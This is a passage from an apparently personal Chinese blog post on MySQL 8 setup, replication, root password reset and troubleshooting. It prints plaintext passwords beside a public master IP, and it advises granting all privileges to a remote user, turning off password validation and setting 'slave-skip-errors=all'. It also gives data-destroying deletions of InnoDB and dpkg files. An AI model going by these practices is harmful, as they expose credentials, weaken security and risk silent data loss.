class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">port &#x3D; 1876</span><br><span class="line"># 数据表以小写保存，但是比较数据表的时候不区分大小写</span><br><span class="line">lower_case_table_names&#x3D;1</span><br><span class="line">default-time-zone&#x3D;&#39;+08:00&#39;</span><br><span class="line"># The number of seconds that the mysqld server waits for a connect packet before responding with Bad handshake. The default value is 10 seconds.</span><br><span class="line"># 所有的参数列表： https:&#x2F;&#x2F;dev.mysql.com&#x2F;doc&#x2F;refman&#x2F;8.0&#x2F;en&#x2F;server-system-variables.html</span><br><span class="line">connect_timeout &#x3D;100</span><br><span class="line"># 默认 28800，8小时</span><br><span class="line">#当一个连接的空闲时间超过8小时后，MySQL 就会断开该连接，而 c3p0&#x2F;dbcp 连接池则以为该被断开的连接依然有效。MySQL server has gone away</span><br><span class="line">wait_timeout&#x3D;100</span><br><span class="line">#默认 28800，8小时</span><br><span class="line">interactive_timeout&#x3D;100</span><br><span class="line"># MySQL默认的最大连接数为100，MySQL服务器支持允许的最大连接数16384</span><br><span class="line">#对mysql初始化内存影响这么大</span><br><span class="line"># 如果设置的太小： 1040-Too many connections，例如当前Max_used_connections&#x3D;98也会出现这个错误：</span><br><span class="line"># 所以合理的设置是： Max_used_connections &#x2F; max_connections * 100% ≈ 85%</span><br><span class="line"># 参考</span><br><span class="line">max_connections&#x3D;1000</span><br><span class="line">max_user_connections&#x3D;850</span><br><span class="line"></span><br><span class="line"># 设置用户密码加密方式</span><br><span class="line">default_authentication_plugin&#x3D;mysql_native_password</span><br><span class="line">log_bin_trust_function_creators&#x3D;1</span><br><span class="line"># 配置主从复制</span><br><span class="line">log-bin&#x3D;mysql-bin</span><br><span class="line">server-id&#x3D;1</span><br><span class="line"># 配置慢查询</span><br><span class="line">slow_query_log &#x3D; ON</span><br><span class="line">slow_query_log_file &#x3D; &#x2F;logs&#x2F;mysql&#x2F;slow.log</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><code>**slave**</code>从数据库读数据库(可选):</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">port &#x3D; 1876</span><br><span class="line"># 数据表以小写保存，但是比较数据表的时候不区分大小写</span><br><span class="line">lower_case_table_names&#x3D;1</span><br><span class="line">default-time-zone&#x3D;&#39;+08:00&#39;</span><br><span class="line"># The number of seconds that the mysqld server waits for a connect packet before responding with Bad handshake. The default value is 10 seconds.</span><br><span class="line"># 所有的参数列表： https:&#x2F;&#x2F;dev.mysql.com&#x2F;doc&#x2F;refman&#x2F;8.0&#x2F;en&#x2F;server-system-variables.html</span><br><span class="line">connect_timeout &#x3D;100</span><br><span class="line"># 默认 28800，8小时</span><br><span class="line">#当一个连接的空闲时间超过8小时后，MySQL 就会断开该连接，而 c3p0&#x2F;dbcp 连接池则以为该被断开的连接依然有效。MySQL server has gone away</span><br><span class="line">wait_timeout&#x3D;100</span><br><span class="line">#默认 28800，8小时</span><br><span class="line">interactive_timeout&#x3D;100</span><br><span class="line"># MySQL默认的最大连接数为100，MySQL服务器支持允许的最大连接数16384</span><br><span class="line">#对mysql初始化内存影响这么大</span><br><span class="line"># 如果设置的太小： 1040-Too many connections，例如当前Max_used_connections&#x3D;98也会出现这个错误：</span><br><span class="line"># 所以合理的设置是： Max_used_connections &#x2F; max_connections * 100% ≈ 85%</span><br><span class="line"># 参考</span><br><span class="line">max_connections&#x3D;1000</span><br><span class="line">max_user_connections&#x3D;850</span><br><span class="line"></span><br><span class="line"># 设置默认户密码加密方式</span><br><span class="line">default_authentication_plugin&#x3D;mysql_native_password</span><br><span class="line">log_bin_trust_function_creators&#x3D;1</span><br><span class="line"># 配置主从复制数据库,为了更好主从复制(io进程和sql进程的操作)低延迟，关闭binlog等</span><br><span class="line">server-id&#x3D;2</span><br><span class="line">skip-log-bin</span><br><span class="line"># 1062 Duplicate entry</span><br><span class="line"># slave-skip-errors&#x3D;1062,1053,1146 #跳过指定error no类型的错误</span><br><span class="line">slave-skip-errors&#x3D;all #跳过所有错误，这个一定要配置，避免不必要的错误导致主从复制失败</span><br><span class="line"># 配置慢查询</span><br><span class="line">slow_query_log &#x3D; 1</span><br><span class="line">slow_query_log_file &#x3D; &#x2F;logs&#x2F;mysql&#x2F;slow.log</span><br><span class="line">long_query_time &#x3D; 5</span><br></pre></td></tr></table></figure><h2 id="配置mysql的用户和密码"><a href="#配置mysql的用户和密码" class="headerlink" title="配置mysql的用户和密码"></a>配置mysql的用户和密码</h2><p>在mysql或者mariadb上运行如下命令进行配置数据库，注意禁止: <strong>VALIDATE PASSWORD COMPONENT</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1. 初始化配置数据库</span><br><span class="line">#  sudo mysql_secure_installation</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">1.  VALIDATE PASSWORD COMPONENT选择为no，这样不用验证password的加密程度</span><br><span class="line">2.  此处root密码可以随便设置一个，因为下面的第三步会重新设置root密码</span><br><span class="line"></span><br><span class="line">-----------------------------------------------</span><br><span class="line">&#x2F;&#x2F; 如果不先设置mysql的密码策略登录的时候会包错误: ERROR 1698 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39;</span><br><span class="line">$ mysql -u root -p (直接不输入密码)</span><br><span class="line"></span><br><span class="line">2. 查看用户密码设置方式</span><br><span class="line">&gt; use mysql;</span><br><span class="line">&gt; SELECT User, Host, plugin FROM mysql.user;</span><br><span class="line"></span><br><span class="line">3. 修改root用户密码插件和密码,参考文档： </span><br><span class="line">1. 推荐文档： https:&#x2F;&#x2F;www.tecmint.com&#x2F;reset-root-password-in-mysql-8&#x2F;</span><br><span class="line">2. 官方文档： https:&#x2F;&#x2F;dev.mysql.com&#x2F;doc&#x2F;refman&#x2F;8.0&#x2F;en&#x2F;resetting-permissions.html</span><br><span class="line">&gt; use mysql;</span><br><span class="line">&gt; UPDATE mysql.user SET plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39;;</span><br><span class="line">&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;Evxx@90&amp;2qvGJ6Q&#x3D;&#39;;</span><br><span class="line">&gt; FLUSH PRIVILEGES;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="添加数据库和用户-包括修改用户密码"><a href="#添加数据库和用户-包括修改用户密码" class="headerlink" title="添加数据库和用户(包括修改用户密码)"></a>添加数据库和用户(包括修改用户密码)</h2><p>logged in mysql using <code>root / xxx</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 创建用户</span><br><span class="line">&gt; create user &#39;syscorer&#39;@&#39;%&#39; identified by &#39;test%&#39;; </span><br><span class="line">&gt; FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">2. 用户权限赋值</span><br><span class="line">WITH GRANT OPTION 这个选项表示该用户可以将自己拥有的权限授权给别人。注意：经常有人在创建操作用户的时候不指定WITH GRANT OPTION选项导致后来该用户不能使用GRANT命令创建用户或者给其它用户授权。</span><br><span class="line">如果不想这个用户有这个grant的权限，可以不加这句</span><br><span class="line"></span><br><span class="line">&gt; GRANT ALL PRIVILEGES ON *.* TO &#39;syscorer&#39;@&#39;%&#39;; </span><br><span class="line">&gt; GRANT ALL PRIVILEGES ON *.* TO &#39;syscorer&#39;@&#39;%&#39; WITH GRANT OPTION;</span><br><span class="line">&gt; FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">3. (可选)修改普通用户密码:</span><br><span class="line">&gt; update user set password&#x3D;PASSWORD(&#39;cTpofe3IwUuzzuqk5Hw2fg&#x3D;P*&amp;35XO2@o)&#x3D;0&#39;) where user&#x3D;&#39;tester&#39;;</span><br><span class="line">&gt; FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">4. 授权特定数据库访问权限，例如数据库testdb</span><br><span class="line"></span><br><span class="line">&gt; GRANT ALL PRIVILEGES ON wp_data.* TO &#39;syscorer&#39;@&#39;%&#39; WITH GRANT OPTION;</span><br><span class="line">&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><h2 id="mysql8数据表大小写敏感（可选-上面第二步已经设置）"><a href="#mysql8数据表大小写敏感（可选-上面第二步已经设置）" class="headerlink" title="mysql8数据表大小写敏感（可选,上面第二步已经设置）"></a>mysql8数据表大小写敏感（可选,上面第二步已经设置）</h2><p>查看大小写配置，大小写是否敏感:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables where Variable_name&#x3D;&#39;lower_case_table_names&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置<code>lower_case_table_names = 1</code>，以便在数据库中使用不区分大小写的表名。 我编辑了<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>，并在[mysqld]下添加了上面的配置。收到以下错误:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Job for mysql.service failed because the control process exited with error code.</span><br><span class="line">See &quot;systemctl status mysql.service&quot; and &quot;journalctl -xe&quot; for details.</span><br></pre></td></tr></table></figure><p>查看mysql的日志文件: <code>tail -f -n 100 /var/log/mysql/error.log</code>,查看MySQL官方文档，有记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lower_case_table_names can only be configured when initializing the server. Changing the lower_case_table_names setting after the server is initialized is prohibited.</span><br></pre></td></tr></table></figure><p>只有在初始化的时候设置 lower_case_table_names=1才有效，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--initialize --lower-case-table-names&#x3D;1</span><br></pre></td></tr></table></figure><h2 id="读写分离配置"><a href="#读写分离配置" class="headerlink" title="读写分离配置"></a>读写分离配置</h2><ol><li>配置读写分离的数据库用户:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> 1.1 master数据库中执行如下命令: </span><br><span class="line"> </span><br><span class="line"> mysql&gt;  CREATE USER &#39;repdev&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;testh&#39;;</span><br><span class="line"> mysql&gt;  GRANT REPLICATION SLAVE ON *.* TO &#39;repdev&#39;@&#39;%&#39;;</span><br><span class="line"> mysql&gt;  flush privileges;</span><br><span class="line"> </span><br><span class="line"> mysql&gt; SHOW MASTER STATUS;</span><br><span class="line">+------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">| mysql-bin.000001 |     2035 |              |                  |                   |</span><br><span class="line">+------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 1.2 slave节点数据库:   注意MASTER_LOG_FILE和MASTER_LOG_POS是master的正确值,命令如下:</span><br><span class="line"></span><br><span class="line">mysql&gt; stop slave;</span><br><span class="line"></span><br><span class="line">mysql&gt;  CHANGE MASTER TO</span><br><span class="line">MASTER_HOST&#x3D;&#39;47.101.187.237&#39;,</span><br><span class="line">MASTER_PORT&#x3D;1876,</span><br><span class="line">MASTER_USER&#x3D;&#39;repdev&#39;,</span><br><span class="line">MASTER_PASSWORD&#x3D;&#39;testh&#39;,</span><br><span class="line">MASTER_LOG_FILE&#x3D;&#39;mysql-bin.000009&#39;,</span><br><span class="line">MASTER_LOG_POS&#x3D;17975043;</span><br><span class="line"></span><br><span class="line">mysql&gt; start slave; </span><br><span class="line">mysql&gt; show slave status\G;</span><br><span class="line"></span><br><span class="line">如果显示的:  Seconds_Behind_Master(主从延时),  Slave_IO_Running&#x3D;Yes, Slave_SQL_Running&#x3D;Yes</span><br><span class="line"></span><br><span class="line"># 修改对应的slave对应的master的log-bin文件</span><br><span class="line">Mysql&gt; CHANGE MASTER TO MASTER_LOG_FILE&#x3D;&#39;mysql-bin.000003&#39;,MASTER_LOG_POS&#x3D;342;</span><br></pre></td></tr></table></figure><p>说明:  Seconds_Behind_Master参数值<br>NULL - 表示io_thread或是sql_thread有任何一个发生故障，也就是该线程的Running状态是No,而非Yes.<br>0 - 该值为零，是我们极为渴望看到的情况，表示主从复制良好，可以认为lag不存在。</p><h3 id="读写分离报错问题"><a href="#读写分离报错问题" class="headerlink" title="读写分离报错问题"></a>读写分离报错问题</h3><p>1.记录删除失败 <code>Could not execute Delete_rows event on table cvr.sys_user; Can&#39;t find record in &#39;sys_user&#39;, Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event&#39;s master log mysql-bin.000005, end_log_pos 46653957</code>错误<br>解决方法：master要删除一条记录，而slave上找不到报错，这种情况主都已经删除了，那么从机可以直接跳过指定数量的错误。</p><h1 id="将同步指针向下移动一个，如果多次不同步可以重复操作"><a href="#将同步指针向下移动一个，如果多次不同步可以重复操作" class="headerlink" title="将同步指针向下移动一个，如果多次不同步可以重复操作"></a>将同步指针向下移动一个，如果多次不同步可以重复操作</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stop slave;set global sql_slave_skip_counter=1;SELECT SLEEP(5);start slave;</span><br></pre></td></tr></table></figure><p>If the error is still there, set a bigger value in sql_slave_skip_counter like:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global sql_slave_skip_counter=1000;</span></span><br></pre></td></tr></table></figure><p>Again, check the status of the slave.</p><p>If you find the skip_sql value is non zero in the slave status then stop the slave again and do:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global sql_slave_skip_counter=0;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> start slave;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>主键重复<code>Last_SQL_Error: Could not execute Write_rows event on table hcy.t1; Duplicate entry &#39;2&#39; for key &#39;PRIMARY&#39;, Error_code: 1062; handler error HA_ERR_FOUND_DUPP_KEY; the event&#39;s master log mysql-bin.000006, end_log_pos 924</code></li></ol><p>在slave已经有该记录，又在master上插入了同一条记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Last_SQL_Error: Could not execute Write_rows event on table hcy.t1; Duplicate entry &#39;2&#39; for key &#39;PRIMARY&#39;, Error_code: 1062; handler error HA_ERR_FOUND_DUPP_KEY; the event&#39;s master log mysql-bin.000006, end_log_pos 924</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>终极解决所有的主从错误同步问题</li></ol><p>直接在<code>mysqld.cnf</code>文件中配置如下忽略所有的错误:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slave-skip-errors&#x3D;all</span><br></pre></td></tr></table></figure><h2 id="忘记root密码重置root密码"><a href="#忘记root密码重置root密码" class="headerlink" title="忘记root密码重置root密码"></a>忘记root密码重置root密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl  stop mysql</span><br><span class="line">sudo mysqld_safe --skip-grant-tables --skip-networking &amp;</span><br><span class="line"># 重启一个命令行窗口执行如下命令</span><br><span class="line">mysql -u root;</span><br><span class="line">use mysql;</span><br><span class="line">SELECT User, Host, plugin FROM mysql.user;</span><br><span class="line">update user set plugin&#x3D;&#39;mysql_native_password&#39; where user&#x3D;&#39;root&#39;;</span><br><span class="line">flush privileges;</span><br><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;cTpofe3IwUuzzuOq0k5Hw2fg&#x3D;&#39;;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>如果报： <code>ERROR 1290 (HY000): The MySQL server is running with the --skip-grant-tables option so it cannot execute this statement</code>,需要执行一下命令: <code>flush privileges</code>,然后再重新执行命令就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mysql_config_editor set \</span><br><span class="line">    --login-path&#x3D;dev\</span><br><span class="line">    --host&#x3D;localhost \</span><br><span class="line">    --user&#x3D;root \</span><br><span class="line">    --password</span><br><span class="line"># mysql --login-path&#x3D;dev</span><br></pre></td></tr></table></figure><h2 id="卸载mysql操作"><a href="#卸载mysql操作" class="headerlink" title="卸载mysql操作"></a>卸载mysql操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;lib&#x2F;dpkg</span><br><span class="line">sudo mv info info.bak</span><br><span class="line">sudo mkdir info</span><br><span class="line">sudo dpkg --configure -a</span><br><span class="line">sudo apt-get install -f</span><br><span class="line">sudo mv &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;info&#x2F;* &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;info.bak</span><br><span class="line">sudo rm -rf &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;info</span><br><span class="line">sudo mv &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;info.bak &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;info</span><br><span class="line">sudo apt remove --purge mysql*</span><br><span class="line"></span><br><span class="line">sudo apt remove mysql-server</span><br><span class="line">sudo apt purge mysql-server</span><br><span class="line">sudo apt autoremove</span><br><span class="line">sudo find &#x2F; -name mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装错误异常"><a href="#安装错误异常" class="headerlink" title="安装错误异常"></a>安装错误异常</h2><blockquote><p>error processing package mysql-community-server (–configure):<br> dependency problems - leaving unconfigured</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt --yes autoremove --purge mysql-server</span><br><span class="line">sudo apt --yes autoremove --purge mysql-client</span><br><span class="line">sudo rm &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; -R</span><br><span class="line">sudo rm &#x2F;etc&#x2F;mysql&#x2F; -R</span><br><span class="line">sudo apt-get autoremove mysql* --purge</span><br><span class="line">sudo apt-get remove apparmor</span><br><span class="line">sudo apt-get install mysql-server mysql-common</span><br></pre></td></tr></table></figure><h2 id="mysql8备份还原从数据文件，-backup-restore"><a href="#mysql8备份还原从数据文件，-backup-restore" class="headerlink" title="mysql8备份还原从数据文件， backup, restore"></a>mysql8备份还原从数据文件， backup, restore</h2><ol><li>（<del>以下的操作没有成功</del>）通常mysql的数据库文件目录为: <strong>/var/lib/mysql</strong></li></ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl stop mysql</span><br><span class="line"># 复制数据盘的mysql的数据库文件夹（例如：cvr)到新的mysql数据库目录： &#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line">$ sudo cp -R &#x2F;opt&#x2F;mysql&#x2F;cvr &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;</span><br><span class="line"># 配置权限</span><br><span class="line">$ sudo chown -R mysql:mysql &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;cvr</span><br><span class="line">$ sudo chmod -R 660 &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;cvr</span><br><span class="line">$ sudo chown  mysql:mysql &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;cvr </span><br><span class="line">$ sudo chmod 700 &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;cvr</span><br><span class="line"></span><br><span class="line">$ sudo systemctl restart mysql</span><br><span class="line">$ sudo mysql -u root -p</span><br><span class="line">&gt; show databases;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>采用sql文件进行恢复数据库,注意不同数据库记得切换下</li></ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p cvr &lt; cvr.sql</span><br></pre></td></tr></table></figure><h2 id="navicat连接mysql-navicat-received-invalid-response-to-SSL-negotiation-j"><a href="#navicat连接mysql-navicat-received-invalid-response-to-SSL-negotiation-j" class="headerlink" title="navicat连接mysql: navicat received invalid response to SSL negotiation: j"></a>navicat连接mysql: navicat received invalid response to SSL negotiation: j</h2><p> 最近通过navicat连接mysql遇到一个提示问题： <code>navicat received invalid response to SSL negotiation: j</code>,而通过其他的mysql客户端可以正常连接，比如 dbforge for MYSQL。 很奇怪，所以确定是navicat那里配置出了问题。</p><p> 网上查了一下一下这个问题，有的说在连接对话框中，查看下SSL和SSH是否勾选了。查了下确认没有勾选，如下：<br> <img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200718092633-2020-07-18.png" alt="20200718092633-2020-07-18"><br> <img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200718092659-2020-07-18.png" alt="20200718092659-2020-07-18"></p><p> 我就很奇怪了，于是删除这个连接，重新新建一个连接。点击“测试连接”，居然可以正常连接访问mysql。所以遇到问题时，千万不要钻牛角尖，换个思路看看，没准柳暗花明。</p><h2 id="mysql字符集和排序规则"><a href="#mysql字符集和排序规则" class="headerlink" title="mysql字符集和排序规则"></a>mysql字符集和排序规则</h2><p> navicat中新建数据库中回选择对应的<strong>字符集</strong>和<strong>排序规则</strong>。</p><ul><li>字符集，这里只要关注两个：utf8和utf8mb4。字符集以_ci（大小写不敏感）、_cs（大小写敏感）或_bin（二元）结束。</li><li>mysql(字符串)排序规则区别</li></ul><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>utf8_bin （utf8mb4_bin）</td><td>将字符串中的每一个字符用二进制数据存储，区分大小写。</td></tr><tr><td>utf8_general_ci（utf8mb4_general_ci）</td><td>不区分大小写，ci为case insensitive的缩写，即大小写不敏感。</td></tr><tr><td>utf8_general_cs（utf8mb4_general_cs）</td><td>区分大小写，cs为case sensitive的缩写，即大小写敏感。</td></tr><tr><td></td><td></td></tr><tr><td>code varchar(20) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL COMMENT ‘唯一码’</td><td></td></tr></tbody></table><h2 id="mysql密码策略不满足"><a href="#mysql密码策略不满足" class="headerlink" title="mysql密码策略不满足"></a>mysql密码策略不满足</h2><p>ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</p><p>使用如下的命令检查mysql密码的验证策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;validate_password%&#39;;</span><br></pre></td></tr></table></figure><p>然后会输出类似如下的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------------+-------+</span><br><span class="line">| Variable_name                        | Value |</span><br><span class="line">+--------------------------------------+-------+</span><br><span class="line">| validate_password.check_user_name    | ON    |</span><br><span class="line">| validate_password.dictionary_file    |       |</span><br><span class="line">| validate_password.length             | 8     |</span><br><span class="line">| validate_password.mixed_case_count   | 1     |</span><br><span class="line">| validate_password.number_count       | 1     |</span><br><span class="line">| validate_password.policy             |MEDIUM |</span><br><span class="line">| validate_password.special_char_count | 1     |</span><br><span class="line">+--------------------------------------+-------+</span><br></pre></td></tr></table></figure><p>如果需要删除这个校验规则，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; uninstall plugin validate_password;</span><br></pre></td></tr></table></figure><h2 id="Could-not-open-or-create-the-system-tablespace-If-you-tried-to-add-new-data-files-to-the-system-tablespace-and-it-failed-here-you-should-now-edit-innodb-data-file-path-in-my-cnf-back-to-what-it-was-and-remove-the-new-ibdata-files-InnoDB-created-in-this-failed-attempt-InnoDB-only-wrote-those-files-full-of-zeros-but-did-not-yet-use-them-in-any-way-But-be-careful-do-not-remove-old-data-files-which-contain-your-precious-data"><a href="#Could-not-open-or-create-the-system-tablespace-If-you-tried-to-add-new-data-files-to-the-system-tablespace-and-it-failed-here-you-should-now-edit-innodb-data-file-path-in-my-cnf-back-to-what-it-was-and-remove-the-new-ibdata-files-InnoDB-created-in-this-failed-attempt-InnoDB-only-wrote-those-files-full-of-zeros-but-did-not-yet-use-them-in-any-way-But-be-careful-do-not-remove-old-data-files-which-contain-your-precious-data" class="headerlink" title="Could not open or create the system tablespace. If you tried to add new data files to the system tablespace, and it failed here, you should now edit innodb_data_file_path in my.cnf back to what it was, and remove the new ibdata files InnoDB created in this failed attempt. InnoDB only wrote those files full of zeros, but did not yet use them in any way. But be careful: do not remove old data files which contain your precious data"></a>Could not open or create the system tablespace. If you tried to add new data files to the system tablespace, and it failed here, you should now edit innodb_data_file_path in my.cnf back to what it was, and remove the new ibdata files InnoDB created in this failed attempt. InnoDB only wrote those files full of zeros, but did not yet use them in any way. But be careful: do not remove old data files which contain your precious data</h2><p>进入mysql的数据目录,注意备份：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line">rm -rf ib_logfile*</span><br><span class="line">rm -rf ibdata1</span><br></pre></td></tr></table></figure><h2 id="mysql-shell-脚本Using-a-password-on-the-command-line-interface-can-be-insecure"><a 